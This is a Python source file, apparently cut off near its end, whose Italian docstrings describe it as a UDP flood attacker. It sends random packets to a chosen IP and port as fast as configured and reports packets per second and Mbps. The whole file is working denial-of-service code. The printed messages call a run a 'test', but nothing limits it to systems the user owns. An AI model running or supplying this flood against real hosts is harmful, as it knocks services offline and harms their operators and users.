import os
import socket
import random
import time

class Attacker:
    def __init__(self, target_ip, target_port=80, duration=60, packet_size=1024, delay=0.001):
        """
        Crea un attaccante UDP per eseguire un flood su un target.

        Parametri:
        - target_ip: IP di destinazione
        - target_port: Porta di destinazione (default: 80)
        - duration: Durata dell'attacco in secondi (default: 60)
        - packet_size: Dimensione di ogni pacchetto in byte (default: 1024)
        - delay: Ritardo tra i pacchetti in secondi (default: 0.001)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.packet_size = packet_size
        self.delay = delay

    def start_attack(self):
        """
        Esegui un attacco UDP flood sul target specificato.
        """
        # Crea il socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Crea dati casuali per il pacchetto
        data = os.urandom(self.packet_size)
        
        packets_sent = 0
        bytes_sent = 0
        start_time = time.time()
        end_time = start_time + self.duration

        print(f"Starting UDP flood to {self.target_ip}:{self.target_port}")
        print(f"Test will run for {self.duration} seconds")
        print(f"Packet size: {self.packet_size} bytes")
        print(f"Press Ctrl+C to stop manually")

        try:
            while time.time() < end_time:
                sock.sendto(data, (self.target_ip, self.target_port))
                packets_sent += 1
                bytes_sent += self.packet_size

                # Stampa le statistiche ogni 1000 pacchetti
                if packets_sent % 1000 == 0:
                    elapsed = time.time() - start_time
                    rate = packets_sent / elapsed if elapsed > 0 else 0
                    mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
                    print(f"Sent {packets_sent} packets, {bytes_sent/1000000:.2f} MB ({rate:.2f} pps, {mbps:.2f} Mbps)")

                # Aggiungi un ritardo tra i pacchetti se specificato
                if self.delay > 0:
                    time.sleep(self.delay)

        except KeyboardInterrupt:
            print("\nTest stopped manually")

        finally:
            # Chiudi il socket
            sock.close()

            # Stampa le statistiche finali
            elapsed = time.time() - start_time
            rate = packets_sent / elapsed if elapsed > 0 else 0
            mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0

            print("\nTest completed")
            print(f"Duration: {elapsed:.2f} seconds")
            print(f"Packets sent: {packets_sent}")
            print(f"Data sent: {bytes_sent/1000000:.2f} MB")
            print(f"Rate: {rate:.2f} packets per second")
            print(f"Bandwid")
